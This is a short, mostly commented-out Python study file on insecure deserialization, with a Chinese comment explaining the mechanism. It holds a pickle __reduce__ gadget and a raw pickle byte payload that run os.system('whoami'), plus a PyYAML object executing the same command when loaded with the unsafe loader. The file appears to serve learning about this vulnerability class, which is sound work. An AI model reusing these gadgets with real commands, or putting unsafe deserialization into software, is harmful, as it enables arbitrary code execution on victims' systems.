# import magic
# mime_type = magic.from_file('/Users/xuwenfen/Downloads/未命名文件.png')
# print(mime_type)
import pickle,os,marshal,yaml

# class test(object):
#     def __reduce__(self):
#     #reduce是一个二元操作函数，第一个参数是函数名，第二个参数是第一个函数的参数数据结构，当类继承基础类object时候才会把这个函数内容序列化，所以反序列化时候才会导致漏洞
#         return (os.system,('whoami',))
# a=test()
# payload=pickle.dumps(a)
# #或者直接payload=b'\x80\x03cposix\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.'


# class yamltest():
#     def __init__(self):
#         os.system('whoami')
# payload=yaml.dump(yamltest())
# fp=open('test.yml','w')
# fp.write(payload)
#
# yaml.load('test.yml')
# yaml.load('test.yml',Loader=yaml.Loader)

